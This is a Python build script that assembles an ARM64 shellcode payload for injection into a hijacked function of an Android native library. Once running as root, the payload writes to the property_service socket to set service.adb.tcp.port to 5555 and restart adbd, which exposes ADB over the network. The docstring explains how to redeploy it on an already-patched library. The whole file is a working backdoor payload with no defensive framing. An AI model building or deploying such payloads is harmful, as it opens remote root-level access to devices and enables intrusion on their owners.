#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload B: adb 5555 enabler that returns directly (pop regs + ret) instead of
using the hijacked function's patched prologue/epilogue.

Why: when deploying on top of an already-modified libbase, the APK's native
patcher reads a corrupted "live prologue" and fills the NOP slots with garbage.
A direct-ret payload never executes those slots, so the second deployment is
safe. Payload length stays 576 so the function tail (epilogue at +636, which
the patcher needs for RET discovery) is not overwritten.
"""
import sys
from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

RESTORE_OFF = 0x1F8
END = 0x240

CODE = """
    stp x0, x30, [sp, #-0x10]!
    stp x19, x20, [sp, #-0x10]!
    stp x21, x22, [sp, #-0x10]!
    mov x8, #0xae
    svc #0
    cbnz w0, ret_early
    mov x8, #0xac
    svc #0
    cmp w0, #1
    b.ne ret_early

    mov x0, #-100
    adr x1, marker
    mov x2, #0xc1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, ret_early
    mov x8, #57
    svc #0

    sub sp, sp, #0x40
    stp xzr, xzr, [sp]
    stp xzr, xzr, [sp, #0x10]
    stp xzr, xzr, [sp, #0x20]
    stp xzr, xzr, [sp, #0x30]
    mov w9, #1
    strh w9, [sp, #6]
    adr x9, sockpath
    ldp x10, x11, [x9]
    ldp x12, x13, [x9, #0x10]
    stp x10, x11, [sp, #8]
    stp x12, x13, [sp, #24]

    adr x20, msgtab
    mov x21, x20
    mov x22, #2
loop:
    ldp w9, w10, [x21], #8
    mov x0, #1
    mov x1, #1
    mov x2, xzr
    mov x8, #198
    svc #0
    tbnz x0, #63, ret_sp_add
    mov x19, x0
    mov x0, x19
    mov x1, sp
    add x1, x1, #6
    mov x2, #31
    mov x8, #203
    svc #0
    tbnz x0, #63, close_and_next
    add x1, x20, x9
    mov x2, x10
    mov x0, x19
    mov x8, #64
    svc #0
close_and_next:
    mov x0, x19
    mov x8, #57
    svc #0
    subs w22, w22, #1
    b.ne loop

    add sp, sp, #0x40
    b ret_early

ret_sp_add:
    add sp, sp, #0x40
ret_early:
    ldp x21, x22, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ldp x0, x30, [sp], #0x10
    ret
"""

MARKER_S = b"/dev/.adb55\x00"
SOCKPATH_S = b"/dev/socket/property_service\x00"
NOP4 = bytes([0x1f, 0x20, 0x03, 0xd5])


def wire(name: bytes, value: bytes) -> bytes:
    import struct
    return (struct.pack("<I", 0x00020001) + struct.pack("<I", len(name)) + name
            + struct.pack("<I", len(value)) + value)


MSGS = [wire(b"service.adb.tcp.port", b"5555"),
        wire(b"ctl.restart", b"adbd")]
MSG_BLOB = b"".join(MSGS)


def align(x, a=8):
    return (x + a - 1) // a * a


def byte_directive(data):
    return ".byte " + ", ".join("0x%02x" % b for b in data) if data else ""


def build():
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    probe = CODE + "\nmarker:\nsockpath:\nmsgtab:\n"
    code_len = len(ks.asm(probe, addr=0)[0])
    data_start = align(code_len)
    msgtab = data_start
    table_len = 8 * len(MSGS)
    msgblob = msgtab + table_len
    marker = align(msgblob + len(MSG_BLOB))
    sockpath = align(marker + len(MARKER_S))
    data_end = sockpath + len(SOCKPATH_S)
    if data_end > RESTORE_OFF:
        raise SystemExit("data overflow %#x" % data_end)

    table = bytearray()
    off = msgblob - msgtab
    for m in MSGS:
        table += off.to_bytes(4, "little") + len(m).to_bytes(4, "little")
        off += len(m)

    parts = [CODE]
    parts.append(".org 0x%x" % msgtab)
    parts.append("msgtab:")
    parts.append(byte_directive(table))
    parts.append(".org 0x%x" % msgblob)
    parts.append("msgblob:")
    parts.append(byte_directive(MSG_BLOB))
    parts.append(".org 0x%x" % marker)
    parts.append("marker:")
    parts.append(byte_directive(MARKER_S))
    parts.append(".org 0x%x" % sockpath)
    parts.append("sockpath:")
    parts.append(byte_directive(SOCKPATH_S))
    # NOP slots for the native patcher's discovery (it will overwrite them; unused)
    parts.append(".org 0x204")
    parts.append(".byte " + ", ".join("0x%02x" % b for b in NOP4 * 7))
    parts.append(".org 0x%x" % END)
    full = "\n".join(parts)
    blob = ks.asm(full, addr=0)[0]
    blob = bytes(blob)
    if len(blob) != END:
        raise SystemExit("size %#x" % len(blob))
    return blob, dict(code_len=code_len, msgtab=msgtab, msgblob=msgblob,
                      marker=marker, sockpath=sockpath, data_end=data_end)


if __name__ == "__main__":
    blob, info = build()
    print("layout:", {k: hex(v) for k, v in info.items()})
    print("size:", len(blob), "entry:", blob[0:16].hex())
    print("nop slots at 0x204:", blob[0x204:0x220].hex())
    out = sys.argv[1] if len(sys.argv) > 1 else "payload_576_direct.bin"
    open(out, "wb").write(blob)
    print("written", out)
